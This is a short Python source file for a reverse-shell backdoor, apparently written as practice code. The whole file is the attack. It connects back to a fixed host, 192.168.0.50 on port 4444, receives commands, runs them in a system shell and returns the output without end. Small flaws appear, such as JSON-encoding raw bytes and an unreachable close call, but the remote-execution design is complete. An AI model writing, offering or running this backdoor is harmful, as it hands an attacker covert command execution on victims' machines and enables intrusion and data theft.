#!/usr/bin/env python
import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # SOCK_STREAM = TCP
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def exec(self, cmd):
        return subprocess.check_output(cmd, shell=True)

    def run(self):
        while True:
            # cmd = self.connection.recv(1024)
            # res = self.exec(cmd)
            # self.connection.send(bytes(res))

            cmd = self.reliable_receive()
            res = self.exec(cmd)
            self.reliable_send(res)
        connection.close()

myBackdoor = Backdoor("192.168.0.50", 4444)
myBackdoor.run()